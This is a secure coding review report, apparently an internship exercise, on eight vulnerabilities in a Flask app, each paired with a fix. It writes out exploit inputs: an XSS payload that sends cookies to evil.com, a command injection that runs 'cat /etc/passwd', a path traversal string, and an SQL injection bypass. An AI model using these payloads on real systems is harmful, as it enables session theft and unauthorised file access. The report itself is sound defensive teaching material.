# CodeAlpha — Task 3: Secure Coding Review Report

**Author:** [Your Name]  
**Date:** 2025  
**Target Application:** `vulnerable_app.py` (Python / Flask)  
**Internship:** CodeAlpha Cybersecurity Internship  

---

## Executive Summary

A manual code review and static analysis of the target Flask application identified **8 critical security vulnerabilities**. Each vulnerability was reproduced, documented, and remediated in the companion file `secure_app.py`.

---

## Findings Summary

| ID | Vulnerability | Severity | CWE |
|----|--------------|----------|-----|
| VULN-01 | Hardcoded Secret Key | High | CWE-798 |
| VULN-02 | SQL Injection | Critical | CWE-89 |
| VULN-03 | Cross-Site Scripting (XSS) | High | CWE-79 |
| VULN-04 | Command Injection | Critical | CWE-78 |
| VULN-05 | Path Traversal | High | CWE-22 |
| VULN-06 | Insecure Deserialization | Critical | CWE-502 |
| VULN-07 | Weak Cryptography (MD5) | High | CWE-327 |
| VULN-08 | Debug Mode in Production | Medium | CWE-489 |

---

## Detailed Findings

### VULN-01: Hardcoded Secret Key (High)

**Location:** `vulnerable_app.py` line 14  
**Code:**
```python
SECRET_KEY = "admin123"
```
**Risk:** Any attacker with code access can forge session tokens or bypass authentication.  
**Remediation:** Generate a cryptographically random secret at runtime:
```python
import secrets
app.secret_key = secrets.token_hex(32)
```

---

### VULN-02: SQL Injection (Critical)

**Location:** `/login` route  
**Code:**
```python
query = f"SELECT * FROM users WHERE username='{user}' AND password='{pwd}'"
```
**Exploit:** Input `' OR '1'='1` as username bypasses authentication entirely.  
**Remediation:** Use parameterised queries (never string interpolation):
```python
cur = conn.execute("SELECT * FROM users WHERE username=?", (user,))
```

---

### VULN-03: Cross-Site Scripting — XSS (High)

**Location:** `/greet` route  
**Code:**
```python
template = f"<h1>Hello, {name}!</h1>"
return render_template_string(template)
```
**Exploit:** `?name=<script>document.location='http://evil.com?c='+document.cookie</script>`  
**Remediation:** Escape user input before rendering:
```python
from flask import escape
name = escape(request.args.get("name", "Guest"))
```

---

### VULN-04: Command Injection (Critical)

**Location:** `/ping` route  
**Code:**
```python
result = subprocess.check_output(f"ping -c 1 {host}", shell=True, text=True)
```
**Exploit:** `?host=google.com; cat /etc/passwd` executes arbitrary shell commands.  
**Remediation:** Use a whitelist and pass arguments as a list (no `shell=True`):
```python
ALLOWED_HOSTS = {"localhost", "127.0.0.1"}
if host not in ALLOWED_HOSTS:
    return "Host not allowed", 400
result = subprocess.check_output(["ping", "-c", "1", host], text=True)
```

---

### VULN-05: Path Traversal (High)

**Location:** `/file` route  
**Code:**
```python
with open(filename, "r") as f:
```
**Exploit:** `?name=../../etc/passwd` reads arbitrary system files.  
**Remediation:** Restrict access to a safe directory using `os.path.abspath`:
```python
SAFE_DIR = os.path.abspath("./public_files")
safe_path = os.path.abspath(os.path.join(SAFE_DIR, filename))
if not safe_path.startswith(SAFE_DIR):
    return "Access denied", 403
```

---

### VULN-06: Insecure Deserialization (Critical)

**Location:** `/load` route  
**Code:**
```python
obj = pickle.loads(data)
```
**Exploit:** Sending a crafted pickle payload executes arbitrary Python code (RCE).  
**Remediation:** Never deserialize untrusted data with pickle. Use JSON:
```python
data = request.get_json(force=True, silent=True)
```

---

### VULN-07: Weak Cryptography — MD5 (High)

**Location:** `store_password()` function  
**Code:**
```python
return hashlib.md5(password.encode()).hexdigest()
```
**Risk:** MD5 is broken for cryptographic use. Rainbow tables can crack common passwords instantly.  
**Remediation:** Use bcrypt or Argon2:
```python
import bcrypt
return bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
```

---

### VULN-08: Debug Mode in Production (Medium)

**Location:** `app.run()` call  
**Code:**
```python
app.run(debug=True, host="0.0.0.0", port=5000)
```
**Risk:** Debug mode exposes an interactive Python console to anyone on the network — effectively full server access.  
**Remediation:**
```python
app.run(debug=False, host="127.0.0.1", port=5000)
```
Use an environment variable to toggle debug mode:
```python
debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Manual Review | Logic flaws, business logic vulnerabilities |
| Bandit (`pip install bandit`) | Python static analysis |
| OWASP ZAP | Dynamic web scanning |
| SQLMap | SQL injection verification |

Run Bandit on any Python project:
```bash
pip install bandit
bandit -r vulnerable_app.py
```

---

## Recommendations

1. **Adopt a Secure SDLC** — integrate security reviews at every stage of development.
2. **Use SAST tools** in CI/CD pipelines (Bandit, SonarQube, Semgrep).
3. **Follow OWASP Top 10** as a baseline security checklist.
4. **Train developers** in secure coding practices.
5. **Conduct regular penetration testing** on production applications.

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [Python Security Best Practices](https://docs.python.org/3/library/secrets.html)
- [Flask Security](https://flask.palletsprojects.com/en/2.3.x/security/)
